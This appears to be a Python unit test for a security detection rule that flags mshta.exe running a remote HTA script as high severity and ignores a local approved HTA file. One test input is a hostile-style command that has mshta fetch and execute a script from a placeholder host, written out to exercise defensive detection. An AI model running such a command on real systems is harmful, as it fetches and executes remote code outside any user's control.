import unittest

from backend.detection import run_detections
from tests.helpers import event


class MshtaDetectionTests(unittest.TestCase):
    def test_remote_mshta_script_execution_is_high(self):
        alerts = run_detections([
            event(
                1,
                source='windows',
                event_type='windows_event',
                process_name='mshta.exe',
                command_line='mshta.exe https://example.invalid/update.hta',
            )
        ])

        self.assertTrue(
            any(
                alert.rule_id == 'DET-WIN-005'
                and alert.severity == 'high'
                and alert.technique == 'T1218.005'
                for alert in alerts
            )
        )

    def test_local_benign_mshta_file_does_not_alert(self):
        alerts = run_detections([
            event(
                1,
                source='windows',
                event_type='windows_event',
                process_name='mshta.exe',
                command_line=r'mshta.exe C:\\Windows\\Help\\approved.hta',
            )
        ])

        self.assertFalse(any(alert.rule_id == 'DET-WIN-005' for alert in alerts))


if __name__ == '__main__':
    unittest.main()
